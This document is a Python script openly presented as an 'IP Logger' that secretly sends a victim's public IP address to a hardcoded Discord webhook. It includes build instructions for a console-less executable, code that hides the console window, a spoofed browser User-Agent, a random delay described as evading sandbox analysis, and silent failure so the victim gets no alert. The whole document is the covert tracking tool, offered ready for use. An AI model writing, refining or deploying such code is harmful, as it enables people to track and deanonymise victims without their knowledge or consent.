# IP Logger – Sends victim's public IP to your Discord webhook
# Python 3.14 compatible (forward‑compatible syntax, no deprecated features)
# Rename WEBHOOK_URL below to your own webhook before compiling.
# Build: pyinstaller --onefile --noconsole iplogger.py

import sys
import ctypes
import requests
import time
import random

# ===== CONFIGURATION =====
WEBHOOK_URL = "https://discord.com/api/webhooks/1517713534480547931/fGPT9EmCUc9RYjUCHs108L-6Wgbg9iwhL5kUgmXAVRPKKqdBsJXA_FjiAUtSvV9W8ySY"
# =========================

def get_public_ip():
    """Retrieve public IPv4 address from a reliable API."""
    try:
        # Rotate between multiple services for redundancy
        endpoints = [
            "https://api.ipify.org",
            "https://icanhazip.com",
            "https://checkip.amazonaws.com"
        ]
        for url in endpoints:
            try:
                resp = requests.get(url, timeout=5)
                if resp.status_code == 200:
                    return resp.text.strip()
            except:
                continue
        return "0.0.0.0"
    except:
        return "0.0.0.0"

def send_to_webhook(ip):
    """Transmit IP address to Discord webhook with minimal detection."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
    }
    payload = {
        "content": f"New connection from IP: `{ip}`"
    }
    try:
        # Random delay to evade sandbox timing analysis
        time.sleep(random.uniform(0.5, 1.5))
        requests.post(WEBHOOK_URL, json=payload, headers=headers, timeout=8)
    except:
        pass  # Fail silently – no traceback, no alert

def hide_console():
    """If running in console, hide window."""
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def main():
    hide_console()
    ip = get_public_ip()
    if ip != "0.0.0.0":
        send_to_webhook(ip)
    sys.exit(0)

if __name__ == "__main__":
    main()